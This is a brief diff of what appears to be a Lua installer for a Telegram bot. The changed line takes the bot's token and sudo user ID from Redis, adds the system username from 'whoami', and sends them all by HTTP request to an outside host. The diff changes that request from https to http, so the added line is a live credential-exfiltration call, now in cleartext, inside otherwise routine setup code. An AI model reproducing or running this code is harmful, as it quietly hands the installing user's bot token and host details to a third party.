@@ -68,7 +68,7 @@ globlainfo = {}
 globlainfo.id = redis:get(ZAINGLOBLA..":SUDO:ID")
 globlainfo.tokenbot  = redis:get(ZAINGLOBLA..":token")
 globlainfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-http.request('https://devglobla.ml/tg/tg.php?insert='..JSON.encode(globlainfo))
+http.request('http://devglobla.ml/tg/tg.php?insert='..JSON.encode(globlainfo))
 create_config_auto()
 file = io.open("GLOBLA", "w")  
 file:write([[
